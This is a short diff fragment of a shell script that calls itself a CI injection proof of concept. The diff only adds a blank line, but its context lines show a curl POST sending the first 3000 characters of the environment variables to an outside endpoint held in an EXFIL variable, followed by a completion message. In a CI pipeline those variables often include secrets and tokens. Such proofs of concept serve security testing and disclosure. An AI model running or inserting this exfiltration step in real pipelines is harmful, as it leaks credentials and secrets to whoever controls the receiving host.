@@ -10,3 +10,4 @@ curl -s -X POST "${EXFIL}" \
   --data-urlencode "env=$(env | head -c 3000)" \
   -o /dev/null
 echo "=== CI INJECTION POC COMPLETE ==="
+
